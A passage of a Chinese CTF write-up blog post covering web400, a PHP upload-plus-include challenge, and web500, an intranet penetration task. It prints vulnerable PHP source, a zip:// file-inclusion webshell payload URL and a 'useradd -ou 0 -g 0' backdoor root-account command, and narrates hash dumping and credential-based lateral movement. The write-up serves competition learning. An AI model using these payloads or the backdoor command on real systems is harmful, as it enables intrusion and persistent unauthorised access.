+<p>得到源码<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">upload.php</div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">	<span class="keyword">require_once</span> <span class="string">'../connect.php'</span>;</div><div class="line">	checkLogined();</div><div class="line">	<span class="keyword">if</span>($_FILES){</div><div class="line">		$upfile=$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</div><div class="line">		$fileTypes=<span class="keyword">array</span>(</div><div class="line">				<span class="string">'jpg'</span>, <span class="string">'png'</span>,<span class="string">'gif'</span>,<span class="string">'zip'</span>,<span class="string">'rar'</span>,<span class="string">'txt'</span>);</div><div class="line"></div><div class="line">		<span class="function"><span class="keyword">function</span> <span class="title">getFileExt</span><span class="params">($file_name)</span> </span>{</div><div class="line">			<span class="keyword">while</span>($dot = strpos($file_name, <span class="string">"."</span>)) {</div><div class="line">				$file_name = substr($file_name, $dot+<span class="number">1</span>);</div><div class="line">			}</div><div class="line">			<span class="keyword">return</span> $file_name;</div><div class="line">		}</div><div class="line">		$test1= strtolower(getFileExt($upfile));</div><div class="line">		<span class="keyword">if</span>(!in_array($test1, $fileTypes)) </div><div class="line">		{</div><div class="line"></div><div class="line">			<span class="keyword">exit</span>();</div><div class="line">		}</div><div class="line">		<span class="keyword">else</span>{</div><div class="line">			$nfile=md5(rand(<span class="number">10</span>,<span class="number">1000</span>).time()).<span class="string">"."</span>.$test1;</div><div class="line">			move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"../file123asdp/"</span> . $nfile);</div><div class="line">			<span class="keyword">echo</span> <span class="string">"ok!&lt;a href=../file123asdp/"</span>.$nfile.<span class="string">"&gt;$nfile&lt;/a&gt;"</span>;</div><div class="line">		}</div><div class="line">	}</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>还有admininfile.php<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">admininfile.php</div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line">	$file=$_GET[<span class="string">'name'</span>].<span class="string">'.php'</span>;</div><div class="line">	<span class="keyword">if</span>(!file_exists($file)){</div><div class="line">		<span class="keyword">echo</span> $file.<span class="string">" not exists!"</span>;</div><div class="line">	}</div><div class="line">	<span class="keyword">include</span>($file);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>看别人的wp发现有很多都是这届读了../flag.php的文件，但是这里其实可以拿shell的，看到上传有zip就想到zip伪协议,构造shell，放在zip文件中，可以用zip://访问shell</p>
+<p>payload<br/><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">106.75</span>.<span class="number">30.59</span>:<span class="number">2333</span><span class="regexp">/admin/</span>admininfile.php?name=zip:<span class="regexp">//</span>..<span class="regexp">/file123asdp/</span><span class="number">7</span>b3b30bc</div><div class="line"><span class="number">74</span>aa1bd666dc94c37af0a465.zip%<span class="number">23</span>test</div></pre></td></tr></table></figure></p>
+<h2 id="web500-内网渗透"><a class="headerlink" href="#web500-内网渗透" title="web500 内网渗透"></a>web500 内网渗透</h2><p>i春秋提供了一个很傻的内网环境，而且工具都是什么奇奇怪怪的东西，第一个web服务优势tomcat。。。没办法，尝试几次都没找到突破口，直接都没做出来…</p>
+<p>研究下别人的wp</p>
+<p>首先第一台web服务是tomcat<br/>拿web目录扫描器扫了下，看到了admin.htm，在这个页面找到几个action，用st2工具试了下，有S2-032漏洞，然后上传个jsp shell，用菜刀连上去，用菜刀的命令行执行工具添加了一个root账号的密码：<br/><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">useradd</span> -ou <span class="number">0</span> -g <span class="number">0</span> aaa;<span class="attribute">echo</span> aaa:aaa|chpasswd</div></pre></td></tr></table></figure></p>
+<p>然后目标是13.2,<br/>访问到13.2，13.2的web界面是个HFS，用远程代码执行漏洞，添加个账号，然后再用putty把13.2的3389转发出来登上去，把cain用RDP磁盘共享的办法传上去，dump出来13.2的所有账户的hash，去网上界面，把administrator和zhangsan的密码都解出来了，然后发现zhangsan的密码可以登陆13.3，但是提示没有RDP登陆的权限，于是先用pstools连接上13.3执行cmd，把administrator的密码改了，登陆13.3，然后打开firefox，在历史记录里面看到了13.1网关的登陆记录，密码也保存在13.3的浏览器里面了，然后登陆13.1，把所有LAN段都设置成互相可以通信，退出来在11.2里面就可以访问14.2了</p>
+<p>最后退回到14.2<br/>用zhangsan的账号再登陆13.2，发现桌面有个txt，里面提到了一个github地址，访问发现一个web的源码<br/><code>https://github.com/1033/apptest</code><br/>正是14.2web的源码，可以上传文件，但是过滤了jsp的后缀名，不过我们可以上传jspx的文件，于是在11.2里面用手写出来一个jspx webshell，成功上传获取到flag.</p>
+</div>
+</div>
+<div class="copyright">
+<p><span>本文标题:</span><a href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></p>
+<p><span>文章作者:</span><a href="/" title="回到主页">LoRexxar</a></p>
+<p><span>发布时间:</span>2016-07-12, 13:42:28</p>
+<p><span>最后更新:</span>2016-07-12, 15:21:16</p>
+<p>
+<span>原始链接:</span><a class="post-url" href="/2016/07/12/guosai-ctf-wp/" title="信息安全国赛技能赛 Writeup">http://lorexxar.cn/2016/07/12/guosai-ctf-wp/</a>
+<span class="copy-path" data-clipboard-text="原文: http://lorexxar.cn/2016/07/12/guosai-ctf-wp/　　作者: LoRexxar" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+<script> var clipboard = new Clipboard('.copy-path'); </script>
+</p>
+<p>
+<span>许可协议:</span><i class="fa fa-creative-commons"></i> <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="license" target="_blank" title="CC BY-NC-SA 4.0 International">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+</div>
+<nav id="article-nav">
+<div class="article-nav-title" id="article-nav-newer">
+<a href="/2016/07/17/sangebaimao_huobi/">
+                    sangebaimao之火币网
+                </a>
+</div>
+<div class="article-nav-title" id="article-nav-older">
+<a href="/2016/06/26/cloudeye/">
+                    一个有趣的东西-cloudeye
+                </a>
+</div>
+</nav>
+</article>
+<div class="toc-article" id="toc">
+<strong class="toc-title">文章目录</strong>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web150-脚本抢金币"><span class="toc-number">1.1.</span> <span class="toc-text">web150 脚本抢金币</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web200-IFS绕过导致的任意curl"><span class="toc-number">1.2.</span> <span class="toc-text">web200 IFS绕过导致的任意curl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web300-SQL"><span class="toc-number">1.3.</span> <span class="toc-text">web300 SQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web400-phpup"><span class="toc-number">1.4.</span> <span class="toc-text">web400 phpup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web500-内网渗透"><span class="toc-number">1.5.</span> <span class="toc-text">web500 内网渗透</span></a></li></ol></li></ol>
+</div>
+<style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+<input id="tocButton" title="点击按钮隐藏或者显示文章目录" type="button" value="隐藏目录"/>
+<script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+<div class="share">
+<div class="bdsharebuttonbox">
+<a class="fa fa-twitter bds_twi" data-cmd="twi" href="#" title="分享到推特"></a>
+<a class="fa fa-weibo bds_tsina" data-cmd="tsina" href="#" title="分享到新浪微博"></a>
+<a class="fa fa-qq bds_sqq" data-cmd="sqq" href="#" title="分享给 QQ 好友"></a>
+<a class="fa fa-files-o bds_copy" data-cmd="copy" href="#" title="复制网址"></a>
+<a class="fa fa fa-envelope-o bds_mail" data-cmd="mail" href="#" title="通过邮件分享"></a>
+<a class="fa fa-weixin bds_weixin" data-cmd="weixin" href="#" title="生成文章二维码"></a>
+<a class="fa fa-share-alt bds_more" data-cmd="more" href="#"></a></div></div></div></div></div></body></html>
+
+<script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"信息安全国赛技能赛 Writeup　| LoRexxar's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+
+<section class="youyan" id="comments">
+<script>
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = 'http://v2.uyan.cc/code/uyan.js?uid=2127998';
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+<script> loadComment(); </script>
+<div id="uyan_frame"></div>
+</section>
+<div class="scroll" id="post-nav-button">
+<a href="/2016/07/17/sangebaimao_huobi/" title="上一篇: sangebaimao之火币网">
+<i class="fa fa-angle-left"></i>
+</a>
+<a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+<a href="/2016/06/26/cloudeye/" title="下一篇: 一个有趣的东西-cloudeye">
+<i class="fa fa-angle-right"></i>
+</a>
+</div>
+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/16/nonce-bypass-script/">通过浏览器缓存来bypass CSP script nonce</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/pppctf2017/">PlaidCTF 2017 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/12/xss-bot2/">xss bot从入门到弃坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/05/09/CSP Is Dead, Long Live CSP! On the Insecurity of Whitelists and the Future of Content Security Policy/">CSP Is Dead, Long Live CSP! 翻译</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/24/pwnhub-jue/">pwnhub 绝对防御 出题思路和反思</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Shadow-Brokers/">Shadow Brokers大新闻整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/360chunqiu2017/">360春秋杯2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/bctf2017-web/">bctf2017 web部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/27/pwnhub-xiaom/">pwnhub 之小m的复仇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/21/0ctf2017-web/">0ctf201 web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/njctf2017-wp/">NJCTF Web部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/05/pwnhub-another-php/">pwnhub_another php web部分</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/zctf2017-writeup/">zctf2017 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/20/pwnhub-open/">pwnhub 打开电脑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/cdn-bypass-csp/">有趣的cdn bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/26/hctf2016-something/">聊聊hctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/pwnhub-shen/">pwnhub 深入敌后</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/03/33c3-wp/">33c32016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/cve-2016-10030/">phpmailer RCE漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/26/pwnhub_mi/">pwnhub_迷</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/xss-protect/">浅谈xss的后台守护问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai2/">pwnhub_拍卖行</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/18/pwnhub-pai/">pwnhub_找朋友</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/10/pwnhub-WTF-writeup/">pwnhub_WTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/07/polyglot-JPEGs-bypass-csp/">using polyglot JPEGs bypass CSP 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/03/redis-getshell/">通过redis getshell的一些小问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/01/hctf2016-other/">hctf2016 简单部分WEB &amp;&amp; misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/30/hctf2016-xss/">hctf2016 guestbook&amp;secret; area writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/29/hctf2016-ATField/">HCTF2016 ATField writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/19/web2-giligili/">hctf2016 giligili writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/31/csp-then2/">CSP进阶-302 Bypass CSP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/28/csp-then/">CSP进阶-link Bypass unsafe line</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/26/ctf-start/">什么是ctf呢？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/hitcon2016-misc/">hitcon2016 misc writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/10/hitcon2016/">hitcon2016 web writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/03/Lctf2016/">L-ctf2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/14/php-wei/">php 伪协议</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/11/huashanbei2016/">华山杯2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/29/crypto-start/">crypto 简单的RSA</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/18/sqlmap-source4/">sqlmap 源码分析（四）开始注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/sqlmap-source3/">sqlmap 源码分析（三）在注入之前</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/11/sqlmap-source2/">sqlmap 源码分析（二）初始化</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/09/sqlmap-source1/">sqlmap 源码分析（一）开始、参数解析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/08/ccsp/">CSP Level 3浅析&amp;简单的bypass</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/07/python-virtualenv/">python virtualenv沙盒命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/xnuca-ctf-wp/">XNUCA2016 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/21/python-tqdm/">python tqdm模块分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/18/cmd-shell/">shell上一些有趣的命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/17/sangebaimao_huobi/">sangebaimao之火币网</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/12/guosai-ctf-wp/">信息安全国赛技能赛 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/26/cloudeye/">一个有趣的东西-cloudeye</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/sangebaimao-zhao/">sangebaimao之招聘又开始了，你怕了吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/06/alictf2016/">alictf2016_web_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/04/sangebaimao1/">sangebaimao 寻找来自星星的你一</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/27/opcache-jcfx/">在php opcache检测隐藏的后门程序</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/12/php-shell/">php webshell 各种函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/asis-bcloud/">Asis2016_Binary Cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/09/sctf2016/">sctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/05/dockerfile/">dockerfile  (・ω・)ノ</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/04/docker-jc/">docker 基础操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/02/ggctf2016/">google_ctf2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/25/cctf2016/">CCTF2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/20/gif-ccsp/">gif bypass CSP?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/j123jt-wp/">j123jt的聊天板大型wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/11/sctf-Obfusion/">sctfq1_Obfusion_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/input-bypasscsrf/">input属性bypass csp</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/06/hctfgame-llfx/">hctfgame_ll的流量分析题</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/phpblack/">is_numeric和trim导致的判断绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/30/web-for-pentest-II/">web_for_pentest_II writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/22/bctf2016/">bctf2016</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/hctfgame_week4+5_writeup/">hctf_game_week4+5_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0ctf2016/">0ctf2016 &amp;&amp; sunshinectf2016 writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/bkp2016-writeup/">bkp2016_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/05/hexo-coding/">hexo转移到coding配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/01/ssctf2015-writeup/">ssctf2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/29/hctfgame_week3_writeup/">hctf_game_week3_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/ldpai/">ldpa简单注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/28/titan-souls-ez/">titan souls 普通模式通关攻略</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/easy_git/">简单的git教程</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week2_writeup/">hctf_game_week2_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week1_writeup/">hctf_game_week1_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/18/hctfgame_week0_writeup/">hctf_game_week0_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/21/dmsj-book/">《代码审计》一点儿笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/hctf2015/">hctf2015的一点儿记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/xss-link/">xss link&amp;svg;黑魔法</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/19/sql-error/">SQL 显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/rctf2015/">RCTF2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/17/isg2015/">ISG2015_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/02/hsb/">SPWC &amp; 华山杯？ writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/24/sqli_h/">关于sqli注入的特殊函数</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
+<script>
+</script>
+
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+<i class="fa fa-copyright"></i> 
+                2014-2017 LoRexxar
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+</div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>| </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+
+<script data-main="/js/main.js" src="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/require.min.js"></script>
+<script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 7;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+<div class="scroll" id="scroll">
+<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+<script async="" src="./信息安全国赛技能赛 Writeup  LoRexxar's Blog/busuanzi.pure.mini.js">
+</script>
+
+
